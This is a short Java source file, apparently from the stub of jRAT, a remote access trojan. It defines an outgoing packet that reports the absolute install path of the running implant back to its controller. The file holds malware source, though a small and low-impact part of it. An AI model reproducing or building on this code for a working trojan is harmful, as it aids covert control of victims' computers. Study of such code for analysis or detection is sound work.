package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.common.io.StringWriter;
import se.jrat.stub.Main;


public class Packet10InitInstallPath extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
		
		File file = new File(path);
		
		sw.writeLine(file.getAbsolutePath());
	}

	@Override
	public byte getPacketId() {
		return (byte) 10;
	}

}
